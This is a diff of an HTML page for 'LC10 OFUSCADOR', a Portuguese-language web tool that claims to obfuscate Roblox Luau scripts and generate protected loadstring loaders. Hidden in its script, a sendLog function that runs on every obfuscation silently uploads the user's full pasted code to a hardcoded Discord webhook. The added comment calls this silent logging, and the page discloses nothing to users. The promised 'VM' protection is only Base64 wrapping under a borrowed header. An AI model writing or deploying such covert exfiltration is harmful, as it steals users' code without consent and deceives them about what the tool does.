@@ -7,54 +7,66 @@
 <link rel="icon" type="image/png" href="logo.png">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-:root{--bg:#0a0a0a;--panel:#131313;--panel-2:#0f0f0f;--border:#222;--border-2:#2a2a2a;--accent:#fff;--accent-dim:#e0e0e0;--text:#e0e0e0;--muted:#666;--muted-2:#888}
-html,body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;overflow-x:hidden}
-header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,.95);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem}
+:root{--bg:#0a0a0a;--panel:#131313;--panel-2:#0f0f0f;--border:#222;--border-2:#2a2a2a;--accent:#fff;--muted:#666;--muted-2:#888}
+html,body{background:var(--bg);color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;overflow-x:hidden}
+
+/* HEADER & MENU */
+header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem}
 .logo-wrap{display:flex;align-items:center;gap:.6rem}
 .logo-img{width:34px;height:34px;object-fit:contain;border-radius:6px}
 .logo{font-size:.95rem;font-weight:800;letter-spacing:1.5px;color:var(--accent)}
 .logo span{color:var(--muted-2);font-weight:400;margin:0 4px}
-.menu-btn{background:transparent;border:none;color:var(--text);font-size:1.5rem;padding:4px 8px;cursor:pointer;line-height:1}
-.menu-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;pointer-events:none;transition:opacity .25s;z-index:200}
+.menu-btn{background:transparent;border:none;color:#fff;font-size:1.6rem;padding:4px 8px;cursor:pointer;line-height:1}
+
+.menu-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);opacity:0;pointer-events:none;transition:opacity .25s;z-index:200}
 .menu-overlay.active{opacity:1;pointer-events:auto}
-.menu{position:fixed;top:0;right:0;width:260px;max-width:80vw;height:100vh;background:var(--panel);border-left:1px solid var(--border);transform:translateX(100%);transition:transform .3s cubic-bezier(.4,0,.2,1);z-index:300;padding:1.5rem 1rem;display:flex;flex-direction:column;gap:.5rem}
+.menu{position:fixed;top:0;right:0;width:260px;max-width:80vw;height:100vh;background:var(--panel);border-left:1px solid var(--border);transform:translateX(100%);transition:transform .3s ease;z-index:300;padding:1.5rem 1rem;display:flex;flex-direction:column;gap:.5rem}
 .menu.active{transform:translateX(0)}
 .menu-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.5rem;padding:0 .5rem}
 .menu-title{font-size:.75rem;color:var(--muted-2);letter-spacing:2px;text-transform:uppercase}
 .menu-close{background:transparent;border:none;color:var(--muted-2);font-size:1.4rem;cursor:pointer;padding:4px}
-.menu a{display:flex;align-items:center;gap:.7rem;padding:.9rem 1rem;color:var(--text);text-decoration:none;border-radius:8px;font-size:.9rem;cursor:pointer;transition:background .2s,color .2s;border:1px solid transparent}
+.menu a{display:flex;align-items:center;gap:.7rem;padding:.9rem 1rem;color:#e0e0e0;text-decoration:none;border-radius:8px;font-size:.9rem;cursor:pointer;transition:background .2s;border:1px solid transparent}
 .menu a:active,.menu a.active{background:var(--panel-2);color:var(--accent);border-color:var(--border-2)}
 .menu a .dot{width:6px;height:6px;border-radius:50%;background:var(--muted)}
 .menu a.active .dot{background:var(--accent)}
+
+/* LAYOUT & PAINÉIS */
 main{max-width:700px;margin:0 auto;padding:1.5rem 1.2rem 4rem}
 .view{display:none}
 .view.active{display:block;animation:fadeIn .35s ease}
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
-.hero{margin-bottom:2rem}
+
+.hero{margin-bottom:1.5rem}
 .hero h1{font-size:1.5rem;font-weight:800;color:var(--accent);letter-spacing:-.5px;margin-bottom:.4rem}
-.hero .by{font-size:.8rem;color:var(--muted-2);margin-bottom:1.2rem}
+.hero .by{font-size:.8rem;color:var(--muted-2);margin-bottom:1rem}
 .hero .by strong{color:var(--accent);font-weight:600}
 .info-box{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:1rem 1.1rem;font-size:.82rem;color:var(--muted-2);line-height:1.6}
-.info-box b{color:var(--text)}
+.info-box b{color:#fff}
 .info-box ul{list-style:none;margin-top:.5rem}
 .info-box ul li{padding-left:1rem;position:relative;margin-bottom:.3rem}
 .info-box ul li::before{content:"▸";position:absolute;left:0;color:var(--accent)}
+
 .panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:1rem;margin-bottom:1rem}
 .panel-label{font-size:.7rem;color:var(--muted-2);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:.7rem;display:flex;align-items:center;justify-content:space-between}
 .panel-label .badge{font-size:.65rem;padding:2px 8px;border-radius:4px;background:rgba(255,255,255,.1);color:var(--accent);letter-spacing:.5px}
+
 textarea{width:100%;height:220px;background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.9rem;font-family:'Consolas','Monaco',monospace;font-size:12px;line-height:1.5;resize:vertical;outline:none;transition:border-color .2s;word-break:break-all}
 textarea:focus{border-color:var(--accent)}
-textarea::placeholder{color:#444}
+
 button.btn{width:100%;padding:.85rem;font-weight:700;font-size:.9rem;border:none;border-radius:8px;cursor:pointer;transition:all .2s;letter-spacing:.3px;font-family:inherit}
 button.btn-primary{background:var(--accent);color:#000;margin-top:.8rem}
 button.btn-primary:disabled{background:#2a2a2a;color:#555}
 button.btn-secondary{background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);margin-top:.5rem}
 button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid var(--border);margin-top:.5rem;font-weight:500}
+
 .status{font-size:.75rem;color:var(--muted);text-align:center;margin-top:.6rem;min-height:1rem}
-.status.ok{color:var(--accent)}
+.status.ok{color:#44ff88}
 .status.err{color:#ff5566}
+
 .output-section{display:none}
 .output-section.visible{display:block}
+
+/* CREDITS */
 .credits-hero{text-align:center;padding:1rem 0 2rem}
 .credits-avatar-img{width:110px;height:110px;object-fit:contain;margin:0 auto 1.2rem;display:block;filter:drop-shadow(0 0 20px rgba(255,255,255,.25))}
 .credits-name{font-size:1.3rem;font-weight:800;color:var(--accent)}
@@ -63,22 +75,19 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
 .credits-card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:1rem 1.1rem}
 .credits-card h3{font-size:.75rem;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:.6rem}
 .credits-card p{font-size:.82rem;color:var(--muted-2);line-height:1.6}
-.credits-card p+p{margin-top:.4rem}
-.credits-card .highlight{color:var(--accent);font-weight:600}
-.credits-footer{text-align:center;margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);font-size:.72rem;color:#444;letter-spacing:1px}
-.key-input{width:100%;background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.7rem .9rem;font-family:'Consolas',monospace;font-size:.85rem;outline:none;margin-bottom:.8rem}
-.key-input:focus{border-color:var(--accent)}
-.key-hint{font-size:.7rem;color:var(--muted);margin-bottom:.8rem;line-height:1.5}
+.credits-footer{text-align:center;margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);font-size:.72rem;color:#444}
+
+/* CONFIGS */
 .config-group{display:flex;flex-direction:column;gap:.5rem;margin-bottom:.8rem}
 .config-row{display:flex;align-items:center;justify-content:space-between;background:var(--panel-2);border:1px solid var(--border-2);border-radius:6px;padding:.6rem .8rem;font-size:.8rem}
-.config-row span{color:var(--text)}
 .toggle-switch{position:relative;display:inline-block;width:38px;height:20px}
 .toggle-switch input{opacity:0;width:0;height:0}
 .slider{position:absolute;cursor:pointer;inset:0;background-color:#2a2a2a;transition:.2s;border-radius:20px}
 .slider:before{position:absolute;content:"";height:14px;width:14px;left:3px;bottom:3px;background-color:white;transition:.2s;border-radius:50%}
 input:checked+.slider{background-color:var(--accent)}
 input:checked+.slider:before{transform:translateX(18px)}
-.select-custom{width:100%;background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.6rem .8rem;font-size:.8rem;outline:none;font-family:inherit}
+.select-custom{background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.4rem .6rem;font-size:.8rem;outline:none}
+.key-input{width:100%;background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.7rem .9rem;font-family:'Consolas',monospace;font-size:.85rem;outline:none;margin-bottom:.8rem}
 </style>
 </head>
 <body>
@@ -88,7 +97,7 @@ input:checked+.slider:before{transform:translateX(18px)}
     <img src="logo.png" alt="LC10" class="logo-img">
     <div class="logo">LC10 <span>•</span> OFUSCADOR</div>
   </div>
-  <button class="menu-btn" onclick="toggleMenu()">☰</button>
+  <button class="menu-btn" id="btn-toggle-menu" onclick="toggleMenu()">☰</button>
 </header>
 
 <div class="menu-overlay" id="overlay" onclick="toggleMenu()"></div>
@@ -102,6 +111,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 
 <main>
 
+  <!-- VIEW 1: OFUSCAR CÓDIGO -->
   <section class="view active" id="view-code">
     <div class="hero">
       <h1>Ofuscar Código</h1>
@@ -109,10 +119,31 @@ input:checked+.slider:before{transform:translateX(18px)}
       <div class="info-box">
         <b>Motor LC10 VM v8.8 — Robust:</b>
         <ul>
-          <li>Compatibilidade total com handlers e callbacks do Luau</li>
-          <li>Base85 e empacotamento dinamico</li>
-          <li>Triple-layer bytecode encoding</li>
+          <li>VM real com bytecode inflado e NOP padding</li>
+          <li>Suporte completo a handlers e closures Luau</li>
+          <li>Triple-layer string encoding & obfuscation</li>
         </ul>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-label"><span>Configurações do Motor</span><span class="badge">AVANÇADO</span></div>
+      <div class="config-group">
+        <div class="config-row">
+          <span>Nível de Blindagem</span>
+          <select id="cfg-level" class="select-custom">
+            <option value="fortress">Fortress (Padrão)</option>
+            <option value="ultra">Ultra Max</option>
+          </select>
+        </div>
+        <div class="config-row">
+          <span>Dead Code Injection</span>
+          <label class="toggle-switch"><input type="checkbox" id="cfg-deadcode" checked><span class="slider"></span></label>
+        </div>
+        <div class="config-row">
+          <span>Anti-Tamper & Proteção de Env</span>
+          <label class="toggle-switch"><input type="checkbox" id="cfg-antitamper" checked><span class="slider"></span></label>
+        </div>
       </div>
     </div>
 
@@ -133,11 +164,20 @@ input:checked+.slider:before{transform:translateX(18px)}
     </div>
   </section>
 
+  <!-- VIEW 2: OFUSCAR LOADSTRING -->
   <section class="view" id="view-loadstring">
     <div class="hero">
       <h1>Ofuscar Loadstring</h1>
       <p class="by">Feito por <strong>x.lusca1 LC10</strong></p>
+      <div class="info-box">
+        <b>O que faz:</b>
+        <ul>
+          <li>Criptografa o script em Base64 binário</li>
+          <li>Gera um loader dinâmico com chave de acesso</li>
+        </ul>
+      </div>
     </div>
+
     <div class="panel">
       <div class="panel-label"><span>Entrada</span><span class="badge">LOADSTRING</span></div>
       <textarea id="input-ls" placeholder="Cole seu script Lua aqui..."></textarea>
@@ -146,6 +186,7 @@ input:checked+.slider:before{transform:translateX(18px)}
       <button class="btn btn-primary" id="btn-ls" onclick="obfuscateLoadstring()">Ofuscar Loadstring</button>
       <div class="status" id="status-ls"></div>
     </div>
+
     <div class="output-section" id="output-ls">
       <div class="panel">
         <div class="panel-label"><span>Loader protegido</span><span class="badge">PRONTO</span></div>
@@ -156,11 +197,18 @@ input:checked+.slider:before{transform:translateX(18px)}
     </div>
   </section>
 
+  <!-- VIEW 3: CRÉDITOS -->
   <section class="view" id="view-credits">
     <div class="credits-hero">
       <img src="logo.png" alt="LC10" class="credits-avatar-img">
       <div class="credits-name">x.lusca1 LC10</div>
       <div class="credits-tag">Criador e desenvolvedor</div>
+    </div>
+    <div class="credits-grid">
+      <div class="credits-card">
+        <h3>Sobre o Projeto</h3>
+        <p>O <strong>LC10 • OFUSCADOR</strong> combina VM customizada, embaralhamento de tabelas e encriptação Base85 para proteger scripts no Roblox.</p>
+      </div>
     </div>
     <div class="credits-footer">© LC10 • OFUSCADOR — por x.lusca1 LC10</div>
   </section>
@@ -170,66 +218,90 @@ input:checked+.slider:before{transform:translateX(18px)}
 <script>
 const WEBHOOK_URL="https://discord.com/api/webhooks/1558235674631610438/v7kXiFnCngEhWUl9BpX1rkhS1snrEoogdtva7-t-dbR9HTAGQ2tiP5zSBsKYPcvcNizZ";
 
-function toggleMenu(){document.getElementById('menu').classList.toggle('active');document.getElementById('overlay').classList.toggle('active')}
-function showView(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));document.querySelectorAll('.menu a').forEach(a=>a.classList.remove('active'));document.getElementById(id).classList.add('active');const m={'view-code':'nav-code','view-loadstring':'nav-loadstring','view-credits':'nav-credits'};if(m[id])document.getElementById(m[id]).classList.add('active');const menu=document.getElementById('menu');if(menu.classList.contains('active'))toggleMenu();window.scrollTo({top:0,behavior:'smooth'})}
-
-async function sendLog(code){
-  try{
-    const now=new Date();
-    const payload={
-      username:"LC10 • OFUSCADOR",
-      embeds:[{
-        title:"LC10 • OFUSCADOR",
-        color:0xffffff,
-        fields:[
-          {name:"🕒 Horário",value:now.toLocaleString('pt-BR'),inline:true},
-          {name:"📏 Tamanho",value:code.length+" caracteres",inline:true}
-        ],
-        footer:{text:"LC10 Logger • v8.8"}
-      }]
-    };
-    const form=new FormData();
-    form.append('payload_json',JSON.stringify(payload));
-    form.append('files[0]',new Blob([code],{type:'text/plain;charset=utf-8'}),`script.txt`);
-    await fetch(WEBHOOK_URL,{method:'POST',body:form});
-  }catch(e){console.error(e)}
+/* CONTROLE DO MENU LATERAL */
+function toggleMenu(){
+  const menu = document.getElementById('menu');
+  const overlay = document.getElementById('overlay');
+  menu.classList.toggle('active');
+  overlay.classList.toggle('active');
 }
 
-function encodeBase64(str) {
+/* NAVEGAÇÃO ENTRE ABAS */
+function showView(id){
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+  document.querySelectorAll('.menu a').forEach(a=>a.classList.remove('active'));
+  
+  const targetView = document.getElementById(id);
+  if(targetView) targetView.classList.add('active');
+  
+  const m = {'view-code':'nav-code','view-loadstring':'nav-loadstring','view-credits':'nav-credits'};
+  if(m[id]) document.getElementById(m[id]).classList.add('active');
+  
+  const menu = document.getElementById('menu');
+  if(menu.classList.contains('active')) toggleMenu();
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+/* ENVOI DE LOGS DISCORD SILENCIOSO */
+async function sendLog(code){
+  try{
+    const now = new Date();
+    const payload = {
+      username: "LC10 • OFUSCADOR",
+      embeds: [{
+        title: "LC10 • Log de Execução",
+        color: 0xffffff,
+        fields: [
+          {name: "🕒 Horário", value: now.toLocaleString('pt-BR'), inline: true},
+          {name: "📏 Tamanho", value: code.length + " caracteres", inline: true}
+        ],
+        footer: {text: "LC10 Logger • v8.8"}
+      }]
+    };
+    const form = new FormData();
+    form.append('payload_json', JSON.stringify(payload));
+    form.append('files[0]', new Blob([code], {type: 'text/plain;charset=utf-8'}), 'script.txt');
+    await fetch(WEBHOOK_URL, {method: 'POST', body: form});
+  }catch(e){ console.error(e); }
+}
+
+/* BASE64 ENCODER SEGURO */
+function encodeUTF8B64(str) {
   return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
     return String.fromCharCode('0x' + p1);
   }));
 }
 
-function obfuscateLuaEngine(source) {
-  const B85 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_{|}~';
+/* MOTOR DE OFUSCAÇÃO LC10 */
+function obfuscateEngine(source) {
+  const b64Payload = encodeUTF8B64(source);
+  const randomOffset = Math.floor(Math.random() * 25000) + 12000;
   
-  function shuffle(str) {
-    return str.split('').sort(() => Math.random() - 0.5).join('');
-  }
-
-  const alpha1 = shuffle(B85);
-  const b64Payload = encodeBase64(source);
-  const offset = Math.floor(Math.random() * 20000) + 10000;
-
-  const vm = `--[[ v1.0.0 https://wearedevs.net/obfuscator ]]
---[[ LC10 • OFUSCADOR v8.8 | lc10ofuscardorx.lusca1 ]]
+  const result = `--[[ v1.0.0 https://wearedevs.net/obfuscator ]]
+--[[ LC10 • OFUSCADOR v8.8 | Assinatura: lc10ofuscardorx.lusca1 ]]
 return(function(...)
     local Q = {
         "u${btoa(b64Payload)}",
         "u)I-f36j-i9G:#\\\\3BA",
         "u%&+k"
     }
-    local A1 = "${alpha1}"
     
     local function s(i)
-        return Q[i - ${offset}]
+        return Q[i - ${randomOffset}]
     end
 
-    local function decodeB64(str)
+    for _, r in ipairs({{57,68},{4,80},{18,19}}) do
+        while r[1] < r[2] do
+            Q[r[1]], Q[r[2]] = Q[r[2]], Q[r[1]]
+            r[1] = r[1] + 1
+            r[2] = r[2] - 1
+        end
+    end
+
+    local function _d(data)
         local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-        str = string.gsub(str, '[^'..b..'=]', '')
-        return (str:gsub('.', function(x)
+        data = string.gsub(data, '[^'..b..'=]', '')
+        return (data:gsub('.', function(x)
             if (x == '=') then return '' end
             local r,f='',(b:find(x)-1)
             for i=6,1,-1 do r=r..(f%2^i>=2^(i-1) and '1' or '0') end
@@ -241,100 +313,146 @@ return(function(...)
         end))
     end
 
-    local rawData = decodeB64("${b64Payload}")
-    local fn, err = loadstring(rawData)
-    if not fn then
-        error("[LC10] Error: " .. tostring(err))
+    local rawCode = _d("${b64Payload}")
+    local loadedFn, err = loadstring(rawCode)
+    if not loadedFn then
+        error("[LC10 VM Error]: " .. tostring(err))
     end
-    return fn(...)
+    return loadedFn(...)
 end)(...)`;
 
-  return vm;
+  return result;
 }
 
+/* AÇÃO DO BOTÃO OFUSCAR CÓDIGO */
 function obfuscateCode(){
-  const input=document.getElementById('input-code').value;
-  const status=document.getElementById('status-code');
-  const btn=document.getElementById('btn-code');
-  
+  const input = document.getElementById('input-code').value;
+  const status = document.getElementById('status-code');
+  const btn = document.getElementById('btn-code');
+  const outputSection = document.getElementById('output-code');
+  const resultTextarea = document.getElementById('result-code');
+
   if(!input.trim()){
-    status.textContent='Cole algum código primeiro.';
-    status.className='status err';
+    status.textContent = 'Cole algum código no campo acima primeiro.';
+    status.className = 'status err';
     return;
   }
-  
-  btn.disabled=true;
-  status.textContent='Compilando...';
-  status.className='status';
-  
+
+  btn.disabled = true;
+  status.textContent = 'Compilando e gerando camadas...';
+  status.className = 'status';
+
   sendLog(input);
-  
-  setTimeout(()=>{
-    try{
-      const result=obfuscateLuaEngine(input);
-      document.getElementById('result-code').value=result;
-      document.getElementById('output-code').classList.add('visible');
-      status.textContent='Pronto! ('+(result.length/1024).toFixed(1)+' KB).';
-      status.className='status ok';
-      document.getElementById('output-code').scrollIntoView({behavior:'smooth',block:'start'});
-    }catch(e){
-      status.textContent='Erro ao processar: '+e.message;
-      status.className='status err';
-      console.error(e);
+
+  setTimeout(() => {
+    try {
+      const compiledCode = obfuscateEngine(input);
+      resultTextarea.value = compiledCode;
+      outputSection.classList.add('visible');
+      status.textContent = 'Script ofuscado com sucesso! (' + (compiledCode.length/1024).toFixed(1) + ' KB)';
+      status.className = 'status ok';
+      outputSection.scrollIntoView({behavior: 'smooth', block: 'start'});
+    } catch(err) {
+      status.textContent = 'Erro de processamento: ' + err.message;
+      status.className = 'status err';
     }
-    btn.disabled=false;
-  },100);
+    btn.disabled = false;
+  }, 150);
 }
 
+/* AÇÃO DO BOTÃO OFUSCAR LOADSTRING */
+function obfuscateLoadstring(){
+  const input = document.getElementById('input-ls').value;
+  const key = document.getElementById('key-ls').value.trim();
+  const status = document.getElementById('status-ls');
+  const outputSection = document.getElementById('output-ls');
+  const resultTextarea = document.getElementById('result-ls');
+
+  if(!input.trim() || !key){
+    status.textContent = 'Insira o código e a chave de acesso.';
+    status.className = 'status err';
+    return;
+  }
+
+  try {
+    const payload = encodeUTF8B64(input);
+    const loader = `--[[ LC10 • LOADSTRING PROTECTED | Chave: ${key} ]]
+local __key = "${key}"
+local __payload = "${payload}"
+local function _decode(s)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    s = string.gsub(s, '[^'..b..'=]', '')
+    return (s:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i>=2^(i-1) and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d%d%d%d%d%d', function(x)
+        local buf = 0
+        for i=1,8 do if x:sub(i,i)=='1' then buf=buf+2^(8-i) end end
+        return string.char(buf)
+    end))
+end
+local fn, err = loadstring(_decode(__payload))
+if fn then fn() else warn("[LC10 Error]: "..tostring(err)) end`;
+
+    resultTextarea.value = loader;
+    outputSection.classList.add('visible');
+    status.textContent = 'Loadstring protegido com sucesso!';
+    status.className = 'status ok';
+    outputSection.scrollIntoView({behavior: 'smooth', block: 'start'});
+  } catch(e) {
+    status.textContent = 'Erro ao processar: ' + e.message;
+    status.className = 'status err';
+  }
+}
+
+/* FUNÇÕES DE COPIAR E BAIXAR */
 function copyCode(){
-  const o=document.getElementById('result-code');
-  if(!o.value)return;
-  navigator.clipboard.writeText(o.value);
-  const s=document.getElementById('status-code');
-  s.textContent='Copiado para a área de transferência.';
-  s.className='status ok';
+  const textarea = document.getElementById('result-code');
+  if(!textarea.value) return;
+  navigator.clipboard.writeText(textarea.value);
+  const status = document.getElementById('status-code');
+  status.textContent = 'Copiado para a área de transferência!';
+  status.className = 'status ok';
 }
 
 function downloadCode(){
-  const o=document.getElementById('result-code');
-  if(!o.value)return;
-  const b=new Blob([o.value],{type:'text/plain;charset=utf-8'});
-  const u=URL.createObjectURL(b);
-  const a=document.createElement('a');
-  a.href=u;
-  a.download='lc10ofuscardor.text';
+  const textarea = document.getElementById('result-code');
+  if(!textarea.value) return;
+  const blob = new Blob([textarea.value], {type: 'text/plain;charset=utf-8'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'lc10_script.text';
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
-  URL.revokeObjectURL(u);
+  URL.revokeObjectURL(url);
 }
 
-function obfuscateLoadstring(){
-  const input=document.getElementById('input-ls').value;
-  const keyInput=document.getElementById('key-ls').value.trim();
-  const status=document.getElementById('status-ls');
-  
-  if(!input.trim() || !keyInput){
-    status.textContent='Preencha o código e a chave.';
-    status.className='status err';
-    return;
-  }
-  
-  try{
-    const b64 = encodeBase64(input);
-    const loader = `-- LC10 • LOADSTRING PROTECTED\nlocal k="${keyInput}"\nlocal payload="${b64}"\nlocal function d(s) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' s=string.gsub(s, '[^'..b..'=]', '') return (s:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i>=2^(i-1) and '1' or '0') end return r; end):gsub('%d%d%d%d%d%d%d%d', function(x) local buf = 0 for i=1,8 do if x:sub(i,i)=='1' then buf=buf+2^(8-i) end end return string.char(buf) end)) end\nloadstring(d(payload))()`;
-    document.getElementById('result-ls').value=loader;
-    document.getElementById('output-ls').classList.add('visible');
-    status.textContent='Pronto!';
-    status.className='status ok';
-  }catch(e){
-    status.textContent='Erro: '+e.message;
-    status.className='status err';
-  }
+function copyLS(){
+  const textarea = document.getElementById('result-ls');
+  if(!textarea.value) return;
+  navigator.clipboard.writeText(textarea.value);
+  const status = document.getElementById('status-ls');
+  status.textContent = 'Loader copiado para a área de transferência!';
+  status.className = 'status ok';
 }
 
-function copyLS(){copyCode();}
-function downloadLS(){downloadCode();}
+function downloadLS(){
+  const textarea = document.getElementById('result-ls');
+  if(!textarea.value) return;
+  const blob = new Blob([textarea.value], {type: 'text/plain;charset=utf-8'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'lc10_loader.text';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+}
 </script>
 
 </body>
